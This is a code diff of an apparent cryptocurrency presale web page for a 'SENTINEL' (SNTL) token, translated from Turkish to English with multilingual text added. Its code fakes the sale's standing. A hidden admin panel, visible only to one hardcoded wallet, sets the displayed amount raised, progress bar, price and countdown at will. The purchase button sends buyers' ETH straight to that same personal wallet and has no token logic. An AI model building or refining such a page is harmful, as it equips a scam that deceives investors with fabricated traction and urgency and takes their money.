@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -49,15 +49,17 @@
 
         /* ADMIN PANEL STYLES (Gizli) */
         #adminPanel {
-            display: none; /* Gizli başlar */
+            display: none; 
             position: fixed; bottom: 0; left: 0; width: 100%;
             background: #1a0505; border-top: 2px solid #ff4444;
             padding: 20px; z-index: 9999; box-shadow: 0 -10px 30px rgba(255,0,0,0.2);
+            max-height: 300px; overflow-y: auto;
         }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; max-width: 1200px; margin: 0 auto; }
-        .admin-item label { display: block; color: #ff8888; font-size: 0.7rem; margin-bottom: 5px; font-weight: bold; }
-        .admin-item input { width: 100%; background: #330a0a; border: 1px solid #551111; color: white; padding: 8px; border-radius: 5px; }
-        .btn-admin { background: #ff4444; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 18px; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; max-width: 1200px; margin: 0 auto; }
+        .admin-item label { display: block; color: #ff8888; font-size: 0.65rem; margin-bottom: 3px; font-weight: bold; }
+        .admin-item input { width: 100%; background: #330a0a; border: 1px solid #551111; color: white; padding: 8px; border-radius: 5px; font-size: 0.8rem; }
+        .btn-admin { background: #ff4444; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 0.8rem; }
+        .btn-admin:hover { background: #ff2222; }
 
         /* SIDEBAR */
         .hamburger { font-size: 1.5rem; color: var(--neon); cursor: pointer; }
@@ -97,6 +99,7 @@
         }
         .countdown { display: flex; justify-content: center; gap: 10px; margin: 15px 0; }
         .time-box { background: #1a2230; padding: 8px 12px; border-radius: 8px; font-family: 'Orbitron'; min-width: 50px; border: 1px solid #333; text-align: center; }
+        .time-label { font-size: 0.6rem; color: #888; display: block; margin-top: 3px; }
         
         .pay-tabs { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 15px; }
         .pay-tab { background: #151b26; border: 1px solid #333; padding: 10px 5px; font-size: 0.75rem; cursor: pointer; text-align: center; border-radius: 8px; display: flex; flex-direction: column; align-items: center; gap: 3px; }
@@ -121,49 +124,65 @@
     <div class="bg-overlay"></div>
 
     <div id="adminPanel">
-        <div style="text-align:center; color:#ff4444; font-weight:bold; margin-bottom:10px; font-family:'Orbitron'">SENTINEL ADMIN</div>
+        <div style="text-align:center; color:#ff4444; font-weight:bold; margin-bottom:10px; font-family:'Orbitron'">COMMAND CENTER</div>
         <div class="admin-grid">
             <div class="admin-item">
-                <label>Toplanan ($)</label>
-                <input type="number" id="admRaised" value="2450000">
+                <label>Raised Amount ($)</label>
+                <input type="number" id="admRaised" value="250000">
             </div>
             <div class="admin-item">
-                <label>SNTL Fiyat ($)</label>
-                <input type="number" id="admPrice" value="0.01">
+                <label>Token Price ($)</label>
+                <input type="number" id="admPrice" value="0.03">
             </div>
             <div class="admin-item">
-                <label>Bar Yüzdesi (%)</label>
-                <input type="number" id="admProg" value="45">
+                <label>Progress Bar (%)</label>
+                <input type="number" id="admProg" value="5">
             </div>
             <div class="admin-item">
-                <button class="btn-admin" onclick="updateSite()">CANLI GÜNCELLE</button>
+                <label>Days Left</label>
+                <input type="number" id="admDays" value="4">
+            </div>
+            <div class="admin-item">
+                <label>Hours Left</label>
+                <input type="number" id="admHours" value="12">
+            </div>
+             <div class="admin-item" style="display:flex; align-items:flex-end;">
+                <button class="btn-admin" onclick="updateSite()">UPDATE ALL</button>
             </div>
         </div>
     </div>
 
     <div class="modal" id="walletModal">
         <div class="modal-box">
-            <h3 style="color:white;">CÜZDAN SEÇİN</h3>
+            <h3 style="color:white; font-family:'Orbitron'" data-lang="select_wallet">SELECT WALLET</h3>
             <div class="wallet-item" onclick="connectManager('metamask')">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror.svg" width="30">
-                <div style="text-align:left; color:white;">MetaMask<br><small style="color:#666;">Direkt / App</small></div>
+                <div style="text-align:left; color:white;">MetaMask<br><small style="color:#666;">Direct / App</small></div>
             </div>
             <div class="wallet-item" onclick="connectManager('bestwallet')">
                 <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" width="30">
-                <div style="text-align:left; color:white;">Best Wallet / Diğer<br><small style="color:#666;">WalletConnect</small></div>
+                <div style="text-align:left; color:white;">Best Wallet<br><small style="color:#666;">Mobile App</small></div>
             </div>
-            <button onclick="closeModal()" style="margin-top:20px; background:none; border:none; color:#555; cursor:pointer;">İptal</button>
+             <div class="wallet-item" onclick="connectManager('other')">
+                <i class="fa fa-wallet" style="font-size:1.5rem; color:#888; margin-left:5px; margin-right:5px;"></i>
+                <div style="text-align:left; color:white;">WalletConnect<br><small style="color:#666;">Other Wallets</small></div>
+            </div>
+            <button onclick="closeModal()" style="margin-top:20px; background:none; border:none; color:#555; cursor:pointer;">Cancel</button>
         </div>
     </div>
 
     <div class="sidebar-overlay" id="overlay" onclick="toggleSidebar()"></div>
     <div class="sidebar" id="sidebar">
         <div class="lang-grid">
-            <div class="lang-btn active">TR</div><div class="lang-btn">EN</div><div class="lang-btn">ZH</div><div class="lang-btn">RU</div><div class="lang-btn">AR</div>
+            <div class="lang-btn" onclick="setLang('tr', this)">TR</div>
+            <div class="lang-btn active" onclick="setLang('en', this)">EN</div>
+            <div class="lang-btn" onclick="setLang('zh', this)">ZH</div>
+            <div class="lang-btn" onclick="setLang('ru', this)">RU</div>
+            <div class="lang-btn" onclick="setLang('ar', this)">AR</div>
         </div>
-        <a href="#" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-home"></i> Ana Sayfa</a>
-        <a href="#vault" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-vault"></i> Kasa</a>
-        <a href="#wp" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-file-alt"></i> Whitepaper</a>
+        <a href="#" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-home"></i> <span data-lang="home">Home</span></a>
+        <a href="#vault" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-vault"></i> <span data-lang="vault">Vault</span></a>
+        <a href="#wp" class="menu-link" onclick="toggleSidebar()"><i class="fa fa-file-alt"></i> <span data-lang="wp">Whitepaper</span></a>
     </div>
 
     <header>
@@ -171,7 +190,7 @@
             <i class="fa fa-shield-halved"></i> SENTINEL
         </div>
         <div class="nav-actions">
-            <button id="mainConnectBtn" class="btn-connect" onclick="openModal()">CÜZDANI BAĞLA</button>
+            <button id="mainConnectBtn" class="btn-connect" onclick="openModal()" data-lang="connect">CONNECT WALLET</button>
             <div id="userAddress" style="display:none; color:var(--neon); font-size:0.8rem; border:1px solid var(--neon); padding:8px 12px; border-radius:8px; cursor:pointer;" onclick="disconnect()">0x...</div>
             <div class="hamburger" onclick="toggleSidebar()"><i class="fa fa-bars"></i></div>
         </div>
@@ -179,13 +198,13 @@
 
     <div class="main-container">
         <div class="hero-text">
-            <h1 id="mainTitle">Geleceğin <br><span>Dijital Kasası</span></h1>
-            <p>Varlıklarınızı koruyun. Askeri düzeyde şifreleme ve miras protokolü.</p>
+            <h1 data-lang="title">Future of <br><span>Digital Vault</span></h1>
+            <p data-lang="desc">Protect your assets with military-grade encryption and decentralized inheritance protocol.</p>
             
             <div class="feature-box">
-                <div class="f-item"><i class="fa fa-shield-virus"></i><h4>Güvenli</h4></div>
-                <div class="f-item"><i class="fa fa-bolt"></i><h4>Hızlı</h4></div>
-                <div class="f-item"><i class="fa fa-network-wired"></i><h4>Multi-Chain</h4></div>
+                <div class="f-item"><i class="fa fa-shield-virus"></i><h4 data-lang="f1">Secure</h4></div>
+                <div class="f-item"><i class="fa fa-bolt"></i><h4 data-lang="f2">Fast</h4></div>
+                <div class="f-item"><i class="fa fa-network-wired"></i><h4 data-lang="f3">Multi-Chain</h4></div>
             </div>
 
             <div style="background: rgba(0,242,255,0.05); padding: 20px; border-radius: 15px; border: 1px dashed var(--neon);">
@@ -202,25 +221,25 @@
 
         <div class="presale-card">
             <div style="text-align:center; margin-bottom:15px;">
-                <h3 style="color:white;">ÖN SATIŞ BİTİŞİ</h3>
+                <h3 style="color:white;" data-lang="presale_end">PRESALE ENDS IN</h3>
                 <div class="countdown">
-                    <div class="time-box">04<br><small>G</small></div>
-                    <div class="time-box">12<br><small>S</small></div>
-                    <div class="time-box">45<br><small>D</small></div>
-                    <div class="time-box">10<br><small>Sn</small></div>
+                    <div class="time-box"><span id="cdDay">04</span><span class="time-label" data-lang="d">D</span></div>
+                    <div class="time-box"><span id="cdHour">12</span><span class="time-label" data-lang="h">H</span></div>
+                    <div class="time-box"><span id="cdMin">45</span><span class="time-label" data-lang="m">M</span></div>
+                    <div class="time-box"><span id="cdSec">10</span><span class="time-label" data-lang="s">S</span></div>
                 </div>
             </div>
 
              <div style="margin-bottom: 20px;">
                 <div style="display:flex; justify-content:space-between; font-size:0.75rem; color:#ccc; margin-bottom:5px;">
-                    <span id="dispRaised">Toplanan: $2,450,000</span>
-                    <span>Hedef: $5,000,000</span>
+                    <span id="dispRaised">Raised: $250,000</span>
+                    <span>Target: $5,000,000</span>
                 </div>
                 <div style="width:100%; height:10px; background:#000; border-radius:10px; border:1px solid #333; overflow:hidden;">
-                    <div id="saleProgress" style="width:45%; height:100%; background:linear-gradient(90deg, #00f2ff, #0051ff);"></div>
+                    <div id="saleProgress" style="width:5%; height:100%; background:linear-gradient(90deg, #00f2ff, #0051ff);"></div>
                 </div>
                 <div style="text-align:center; font-size:0.75rem; color:#888; margin-top:5px;">
-                    1 SNTL = <span style="color:var(--neon)" id="dispPrice">$0.01</span>
+                    1 SNTL = <span style="color:var(--neon)" id="dispPrice">$0.03</span>
                 </div>
             </div>
 
@@ -232,29 +251,60 @@
             </div>
 
             <div class="input-group">
-                <label>Ödeyeceğiniz Miktar</label>
+                <label data-lang="you_pay">You Pay</label>
                 <input type="number" id="amtIn" placeholder="0" oninput="calc()">
                 <span id="currLabel">ETH</span>
             </div>
             <div class="input-group">
-                <label>Alacağınız SNTL</label>
+                <label data-lang="you_get">You Receive</label>
                 <input type="number" id="amtOut" readonly placeholder="0">
                 <span>SNTL</span>
             </div>
 
-            <button class="btn-connect" style="width:100%; padding:15px; margin-top:10px;" onclick="checkBuy()">ŞİMDİ SATIN AL</button>
+            <button class="btn-connect" style="width:100%; padding:15px; margin-top:10px;" onclick="checkBuy()" data-lang="buy_btn">BUY TOKENS NOW</button>
         </div>
     </div>
 
     <script>
-        // --- SENİN ADRESİN (HEM YÖNETİCİ HEM KASA) ---
-        // Bu adresi hem admin kontrolü hem de para toplama için kullanıyoruz
+        // ADRESİN
         const OWNER_ADDRESS = "0xd81f6b82683b4b8a2a08998dBcf33ebC5498715D"; 
         
         let rates = { eth: 2650, bnb: 600, usdc: 1, btc: 48000 };
         let currentCurr = 'eth';
         let isConnected = false;
-        let sntlPrice = 0.01;
+        let sntlPrice = 0.03;
+        
+        // TIMER MANTIĞI
+        let totalSeconds = (4 * 24 * 3600) + (12 * 3600) + (45 * 60); // Varsayılan süre
+        let timerInterval;
+
+        function startTimer() {
+            if(timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                if(totalSeconds > 0) {
+                    totalSeconds--;
+                    updateTimerDisplay();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const d = Math.floor(totalSeconds / (3600 * 24));
+            const h = Math.floor((totalSeconds % (3600 * 24)) / 3600);
+            const m = Math.floor((totalSeconds % 3600) / 60);
+            const s = Math.floor(totalSeconds % 60);
+            
+            document.getElementById('cdDay').innerText = d < 10 ? "0"+d : d;
+            document.getElementById('cdHour').innerText = h < 10 ? "0"+h : h;
+            document.getElementById('cdMin').innerText = m < 10 ? "0"+m : m;
+            document.getElementById('cdSec').innerText = s < 10 ? "0"+s : s;
+        }
+
+        // Sayfa Yüklendiğinde
+        window.onload = function() {
+            startTimer();
+            setLang('en', document.querySelectorAll('.lang-btn')[1]); // İngilizce Başlat
+        };
 
         function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
         function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
@@ -268,7 +318,7 @@
                 onConnect(addr);
             } else {
                  if(type === 'metamask') window.location.href = "https://metamask.app.link/dapp/" + window.location.host;
-                 else alert("Lütfen Cüzdan Uygulamasından Açın");
+                 else alert("Please open inside Wallet App");
             }
         }
 
@@ -280,32 +330,39 @@
             document.getElementById('statusTxt').innerText = "ONLINE";
             document.getElementById('statusTxt').style.color = "#0f0";
             
-            // ADMIN KONTROLÜ (Senin adresinse panel açılır)
             if(addr.toLowerCase() === OWNER_ADDRESS.toLowerCase()) {
                 document.getElementById('adminPanel').style.display = 'block';
             }
-
             isConnected = true;
             closeModal();
         }
 
         function disconnect() {
-            if(confirm("Çıkış yapılsın mı?")) {
+            if(confirm("Disconnect Wallet?")) {
                 location.reload();
             }
         }
 
-        // ADMIN: Siteyi Canlı Güncelle
+        // ADMIN UPDATE
         function updateSite() {
+            // Değerleri Al
             let raised = document.getElementById('admRaised').value;
             let price = document.getElementById('admPrice').value;
             let prog = document.getElementById('admProg').value;
+            let days = document.getElementById('admDays').value;
+            let hours = document.getElementById('admHours').value;
 
-            document.getElementById('dispRaised').innerText = "Toplanan: $" + Number(raised).toLocaleString();
+            // Siteye Uygula
+            document.getElementById('dispRaised').innerText = "Raised: $" + Number(raised).toLocaleString();
             document.getElementById('dispPrice').innerText = "$" + price;
             document.getElementById('saleProgress').style.width = prog + "%";
             sntlPrice = price;
-            alert("Site Bilgileri Güncellendi Ortak!");
+
+            // Süreyi Güncelle
+            totalSeconds = (days * 24 * 3600) + (hours * 3600);
+            startTimer(); // Sayacı yeniden başlat
+
+            alert("Site & Timer Updated!");
         }
 
         function setTab(c, el) {
@@ -327,25 +384,42 @@
 
         async function checkBuy() {
             if(!isConnected) { openModal(); return; }
+            if(currentCurr === 'btc') { alert("Manual BTC Transfer Required."); return; }
 
-            // Eğer BTC seçildiyse farklı bir işlem yapmalıyız
-            if(currentCurr === 'btc') {
-                alert("Lütfen BTC'yi şu adrese manuel gönderin: (Adres Eklenecek)");
-                return;
-            }
-
-            // ETH/BNB/USDC için otomatik cüzdan tetiklemesi
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
+                // Sepolia veya Mainnet fark etmez, cüzdan neredeyse oradan gönderir
                 const tx = await signer.sendTransaction({
                     to: OWNER_ADDRESS,
                     value: ethers.utils.parseEther(document.getElementById('amtIn').value)
                 });
-                alert("İşlem Başarılı! TX: " + tx.hash);
+                alert("TX Sent! Hash: " + tx.hash);
             } catch(e) {
-                alert("İşlem iptal edildi.");
+                alert("Transaction Cancelled");
             }
+        }
+        
+        // DİL YÖNETİMİ
+        const txt = {
+            tr: { connect: "CÜZDANI BAĞLA", title: "Geleceğin<br><span>Dijital Kasası</span>", desc: "Varlıklarınızı koruyun. Dijital mirasınızı güvenceye alın.", presale_end: "ÖN SATIŞ BİTİŞİ", you_pay: "Ödeyeceğiniz Miktar", you_get: "Alacağınız SNTL", buy_btn: "ŞİMDİ SATIN AL", home: "Ana Sayfa", vault: "Kasa", wp: "Whitepaper", f1:"Güvenli", f2:"Hızlı", f3:"Çoklu Ağ", select_wallet: "CÜZDAN SEÇİN", d:"G", h:"S", m:"D", s:"Sn" },
+            en: { connect: "CONNECT WALLET", title: "Future of<br><span>Digital Vault</span>", desc: "Protect your assets. Secure your digital legacy.", presale_end: "PRESALE ENDS IN", you_pay: "You Pay", you_get: "You Receive", buy_btn: "BUY TOKENS NOW", home: "Home", vault: "Vault", wp: "Whitepaper", f1:"Secure", f2:"Fast", f3:"Multi-Chain", select_wallet: "SELECT WALLET", d:"D", h:"H", m:"M", s:"S" },
+            zh: { connect: "连接钱包", title: "未来的<br><span>数字金库</span>", desc: "保护您的资产。确保您的数字遗产。", presale_end: "预售结束于", you_pay: "支付金额", you_get: "获得 SNTL", buy_btn: "立即购买", home: "主页", vault: "金库", wp: "白皮书", f1:"安全", f2:"快速", f3:"多链", select_wallet: "选择钱包", d:"天", h:"时", m:"分", s:"秒" },
+            ru: { connect: "ПОДКЛЮЧИТЬ", title: "Будущее<br><span>Цифрового Сейфа</span>", desc: "Защитите свои активы. Цифровое наследие.", presale_end: "КОНЕЦ ПРОДАЖИ", you_pay: "Вы платите", you_get: "Вы получаете", buy_btn: "КУПИТЬ", home: "Главная", vault: "Сейф", wp: "Документация", f1:"Безопасно", f2:"Быстро", f3:"Мульти-сеть", select_wallet: "ВЫБРАТЬ КОШЕЛЕК", d:"Д", h:"Ч", m:"М", s:"С" },
+            ar: { connect: "ربط المحفظة", title: "مستقبل<br><span>الخزنة الرقمية</span>", desc: "احمِ أصولك. تأمين ميراثك الرقمي.", presale_end: "نهاية البيع المسبق", you_pay: "أنت تدفع", you_get: "أنت تستلم", buy_btn: "شراء الآن", home: "الرئيسية", vault: "الخزنة", wp: "ورقة عمل", f1:"آمن", f2:"سريع", f3:"متعدد الشبكات", select_wallet: "اختر المحفظة", d:"ي", h:"س", m:"د", s:"ث" }
+        };
+
+        function setLang(l, el) {
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+            
+            document.querySelectorAll('[data-lang]').forEach(elem => {
+                const key = elem.getAttribute('data-lang');
+                if(txt[l][key]) {
+                    if(elem.tagName === 'INPUT') elem.placeholder = txt[l][key];
+                    else elem.innerHTML = txt[l][key];
+                }
+            });
         }
     </script>
 </body>
